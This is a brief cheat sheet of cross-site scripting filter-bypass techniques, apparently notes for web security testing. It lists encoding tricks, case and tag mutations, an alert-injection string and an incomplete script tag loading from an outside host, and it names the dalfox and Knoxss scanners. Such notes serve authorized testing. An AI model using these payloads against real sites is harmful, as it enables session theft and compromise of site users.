# XSS Methodology


Use basic Payloads according to the field

if reflected as `&lt;` or `%3C` do double encoding

if `<script>` converted as  `&lt;script&gt;` then give `%26lt;script%26gt;` may gives us `<script>`

try `svg` payload if some are blacklisted 

if `<script>` is blocked try for incomplete payload. `<script src=//mysite.com?c=` 

Encoding `<%00h2>` `%0d`, `%0a`, `%09` between the payload.

Bypass blacklist hardcoded strings `</script/x>` `<ScRipt>`

Try `%09 %07 %0d%0a` unicode chars

`‘);alert(‘example’);`

```
echo www.example.com/query?q=Payloadpath | dalfox pipe
```

```
Knoxss
```

